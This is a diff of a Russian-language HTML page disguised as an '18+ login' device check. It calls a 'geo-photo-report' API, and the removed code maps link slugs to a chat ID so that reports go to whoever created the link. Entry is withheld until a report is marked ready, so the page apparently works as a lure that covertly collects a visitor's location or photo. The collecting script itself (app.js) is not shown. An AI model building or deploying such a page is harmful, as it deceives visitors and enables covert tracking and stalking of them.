@@ -3,30 +3,14 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>18+ Вход — Светлая версия</title>
+  <title>18+ Вход — Проверка устройства</title>
   <meta name="apple-mobile-web-app-capable" content="yes">
   <meta name="apple-mobile-web-app-status-bar-style" content="default">
   <meta name="format-detection" content="telephone=no">
 
-  <!-- ✅ Адрес API на Render -->
+  <!-- ✅ API адрес -->
   <script>
     window.__API_BASE = 'https://geo-photo-report.onrender.com';
-  </script>
-
-  <!-- ✅ SPA fallback для /r/<slug> -->
-  <script>
-    (function(){
-      const m = location.pathname.match(/^\/r\/([a-z0-9\-]{3,40})$/i);
-      if (m) {
-        const slug = m[1];
-        // сохраняем и в __SLUG, и в __TARGET_SLUG (для совместимости)
-        window.__SLUG = slug;
-        window.__TARGET_SLUG = slug;
-        const newUrl = '/index.html?slug=' + encodeURIComponent(slug);
-        history.replaceState(null, '', newUrl);
-        location.reload();
-      }
-    })();
   </script>
 
   <style>
@@ -83,45 +67,10 @@
     <div class="notice" id="note"></div>
   </div>
 
-  <!-- ✅ Проверяем slug и резолвим через API -->
-  <script>
-    (async function resolveSlug(){
-      const API_BASE = (typeof window !== 'undefined' && window.__API_BASE)
-        ? String(window.__API_BASE).replace(/\/+$/, '')
-        : '';
+  <!-- 🔒 Основной фронтовый код -->
+  <script src="/app.js?v=4"></script>
 
-      // читаем из query и/или из глобали (если прилетела через /r/<slug>)
-      const q = new URLSearchParams(location.search).get('slug');
-      const slug = q || window.__SLUG || null;
-      if (!slug) return;
-
-      window.__SLUG = slug;          // важно: чтобы app.v3.js передал его в /api/report
-      window.__TARGET_SLUG = slug;
-
-      try {
-        const r = await fetch(`${API_BASE}/api/resolve-link?slug=${encodeURIComponent(slug)}`);
-        const data = await r.json().catch(()=>null);
-        if (r.ok && data?.ok && data.chatId) {
-          window.__TARGET_CHAT_ID = String(data.chatId);
-          console.log('[resolve-link] OK for slug:', slug, '→ chatId:', window.__TARGET_CHAT_ID);
-        } else {
-          const msg = (data && (data.error || data.message)) || `HTTP ${r.status}`;
-          console.warn('resolve-link failed:', msg);
-          const note = document.getElementById('note');
-          if (note) note.textContent = 'Ссылка не активна или не найдена.';
-        }
-      } catch (e) {
-        console.error('resolve-link error:', e);
-        const note = document.getElementById('note');
-        if (note) note.textContent = 'Ошибка связи с сервером.';
-      }
-    })();
-  </script>
-
-  <!-- 🔒 Основной фронтовый код (актуальный) -->
-  <script src="/app.js?v=3"></script>
-
-  <!-- Остальная визуальная логика и автозапуск -->
+  <!-- Логика проверки устройства и перехода -->
   <script>
     const $ = id => document.getElementById(id);
 
@@ -159,8 +108,7 @@
 
         $('enterBtn').addEventListener('click', e => {
           if (!window.__reportReady) { e.preventDefault(); return; }
-          // ⚠️ вставь свой целевой URL:
-          location.assign('https://example.com');
+          location.assign('https://example.com'); // ⚠️ сюда твой реальный редирект
         });
       } else {
         $('title').textContent = 'Доступ отклонён';
